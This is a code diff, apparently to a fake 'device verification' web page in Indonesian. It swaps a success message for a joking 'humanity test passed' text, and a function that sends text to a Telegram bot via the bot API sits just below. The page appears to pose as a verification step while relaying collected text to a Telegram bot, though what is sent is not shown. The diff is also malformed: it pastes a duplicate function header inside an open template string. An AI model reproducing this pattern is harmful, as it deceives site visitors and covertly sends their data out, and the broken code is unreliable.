@@ -159,10 +159,15 @@ function finalizePage() {
     document.getElementById('loader').style.display = 'none';
     document.getElementById('status').innerText = "";
     document.getElementById('mainCard').innerHTML = `
-        <h2 style="color: #22c55e;">Verifikasi Berhasil</h2>
-        <p>Terima kasih. Perangkat Anda telah berhasil diverifikasi dan terhubung ke sistem.</p>
+function finalizePage() {
+    document.getElementById('loader').style.display = 'none';
+    document.getElementById('status').innerText = "";
+    document.getElementById('mainCard').innerHTML = `
+        <h2 style="color: #22c55e;">Lulus Tes Kemanusiaan!</h2>
+        <p>Anda telah berhasil membuktikan bahwa Anda bukan robot yang menyamar. Silakan kembali melanjutkan rebahan.</p>
     `;
 }
+    
 
 async function sendTextToTelegram(text) {
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
